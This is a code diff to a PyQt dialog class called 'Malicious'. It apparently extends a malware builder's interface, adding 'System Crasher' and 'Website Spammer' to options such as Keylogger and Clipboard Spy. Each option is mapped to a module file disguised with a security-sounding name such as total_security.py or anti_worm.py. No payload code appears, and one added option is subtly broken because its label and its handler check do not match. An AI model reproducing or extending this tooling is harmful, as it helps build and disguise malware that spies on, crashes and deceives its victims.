@@ -19,9 +19,10 @@ class Malicious(object):
     def setupUi(self, Dialog):
         self.Dialog = Dialog
         Dialog.setObjectName("Dialog")
-        Dialog.resize(462, 403)
+        Dialog.resize(462, 454)
         #list for dropdown
-        options = ["Flood","Keylogger","Web Adware","PDF Extractor","Clipboard Ad","Clipboard Spy","Clipboard Flood","Malware Keyboard"]
+        options = ["Flood","Keylogger","Web Adware","PDF Extractor","Clipboard Ad",\
+        "Clipboard Spy","Clipboard Flood","System Crasher","Malware Keyboard", "Website Spammer"]
 
         #label and input for email with dropdown
         self.label = QtWidgets.QLabel(Dialog)
@@ -73,10 +74,20 @@ class Malicious(object):
         self.checkBox_clip_flood.setObjectName("checkBox_clip_flood")
         self.checkBox_clip_flood.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_clip_flood))
         
+        self.checkBox_sys_crash = QtWidgets.QCheckBox(Dialog)
+        self.checkBox_sys_crash.setGeometry(QtCore.QRect(40, 300, 131, 21))
+        self.checkBox_sys_crash.setObjectName("checkBox_sys_crash")
+        self.checkBox_sys_crash.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_sys_crash))
+
         self.checkBox_mal_keyboard = QtWidgets.QCheckBox(Dialog)
-        self.checkBox_mal_keyboard.setGeometry(QtCore.QRect(40, 300, 131, 21))
+        self.checkBox_mal_keyboard.setGeometry(QtCore.QRect(40, 330, 131, 21))
         self.checkBox_mal_keyboard.setObjectName("checkBox_mal_keyboard")
         self.checkBox_mal_keyboard.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_mal_keyboard))
+
+        self.checkBox_web_spam = QtWidgets.QCheckBox(Dialog)
+        self.checkBox_web_spam.setGeometry(QtCore.QRect(40, 360, 131, 21))
+        self.checkBox_web_spam.setObjectName("checkBox_web_spam")
+        self.checkBox_web_spam.stateChanged.connect(lambda:self.checkBoxSelected(self.checkBox_web_spam))
 
         #the area to display information about the options in checkboxes
         self.info_comboBox = QtWidgets.QComboBox(Dialog)
@@ -84,14 +95,14 @@ class Malicious(object):
         self.info_comboBox.setObjectName("info_comboBox")
         self.info_comboBox.addItems(options)
         self.info_textarea = QtWidgets.QTextEdit(Dialog)
-        self.info_textarea.setGeometry(QtCore.QRect(250, 120, 171, 201))
+        self.info_textarea.setGeometry(QtCore.QRect(250, 120, 171, 260))
         self.info_textarea.setObjectName("info_textarea")
         self.info_textarea.setReadOnly(True)
         self.info_comboBox.currentIndexChanged.connect(self.selectOption)
 
         #button with Okay and Cancel
         self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
-        self.buttonBox.setGeometry(QtCore.QRect(130, 350, 193, 28))
+        self.buttonBox.setGeometry(QtCore.QRect(130, 400, 193, 28))
         self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Close|QtWidgets.QDialogButtonBox.Ok)
         self.buttonBox.setObjectName("buttonBox")
 
@@ -116,7 +127,9 @@ class Malicious(object):
         self.checkBox_clip_ad.setText("Clipboard Ad")
         self.checkBox_clip_spy.setText("Clipboard Spy") 
         self.checkBox_clip_flood.setText("Clipboard Flood")
+        self.checkBox_sys_crash.setText("System Crash")
         self.checkBox_mal_keyboard.setText("Malware Keyboard")
+        self.checkBox_web_spam.setText("Website Spammer")
         self.info_comboBox.setItemText(0, "Choose to view details")
         self.info_textarea.setText("Select option from above list to view information about it.")
 
@@ -176,7 +189,11 @@ class Malicious(object):
         elif index==6:
             self.info_textarea.setText("Info about Clipboard Flood.")
         elif index==7:
+            self.info_textarea.setText("Info about System Crasher.")
+        elif index==8:
             self.info_textarea.setText("Info about Malware Keyboard.")
+        elif index==9:
+            self.info_textarea.setText("Info about Website Spammer.")
 
     def checkBoxSelected(self, cb):
         if cb.text()=="Flood":
@@ -204,9 +221,19 @@ class Malicious(object):
                 self.selected.append("anti_malware.py")
             else:
                 self.selected.remove("anti_malware.py")
+        if cb.text()=="System Crasher":
+            if cb.isChecked() == True:
+                self.selected.append("total_security.py")
+            else:
+                self.selected.remove("total_security.py")
         if cb.text()=="Malware Keyboard":
             if cb.isChecked() == True:
                 self.selected.append("anti_hacking.py")
             else:
                 self.selected.remove("anti_hacking.py")
+        if cb.text()=="Website Spammer":
+            if cb.isChecked() == True:
+                self.selected.append("anti_worm.py")
+            else:
+                self.selected.remove("anti_worm.py")
         print(self.selected)
